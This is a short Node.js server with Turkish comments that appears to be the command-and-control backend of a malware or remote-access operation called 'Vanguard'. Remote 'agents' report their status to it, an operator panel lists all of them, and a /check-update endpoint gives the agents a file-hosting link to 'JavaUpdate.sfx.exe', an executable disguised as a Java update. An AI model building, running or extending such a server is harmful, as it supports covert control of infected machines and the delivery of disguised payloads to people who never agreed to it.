const http = require('http');

// Render.com'un atadığı portu kullanmak ZORUNDASIN
const PORT = process.env.PORT || 3000;

// Veritabanı (RAM'de tutulur, sunucu kapanırsa sıfırlanır)
let clientStatus = {};

const server = http.createServer((req, res) => {
    // --- CORS AYARLARI (Masaüstündeki HTML dosyasının bağlanması için ŞART) ---
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'OPTIONS, GET, POST');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // Tarayıcı "Pre-flight" kontrolü yaparsa "OK" de
    if (req.method === 'OPTIONS') {
        res.writeHead(204);
        res.end();
        return;
    }

    // 1. AJAN RAPORLAMA (Ajanlar buraya durum bildirir)
    if (req.url === '/report' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                clientStatus[data.name] = data; // Veriyi kaydet
                console.log(`[DATA] ${data.name} raporladı: ${data.status}`);
                res.end("OK");
            } catch (e) { res.end("JSON Error"); }
        });
    }

    // 2. ADMIN PANELI (Senin HTML dosyan verileri buradan çeker)
    else if (req.url === '/api/all-clients') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(clientStatus));
    }

    // 3. GÜNCELLEME KONTROL
    else if (req.url === '/check-update') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        // Örnek güncelleme linki
        res.end(JSON.stringify({ 
            version: "3.6.0", 
            url: "https://cold-eu-agl-1.gofile.io/download/web/adb10aee-fdd6-4cb6-8ca5-27f2a030604c/JavaUpdate.sfx.exe" 
        }));
    }

    else {
        res.end("Vanguard Server Online (Render)");
    }
});

server.listen(PORT, () => {
    console.log(`Server Render portunda (${PORT}) çalışıyor.`);
});
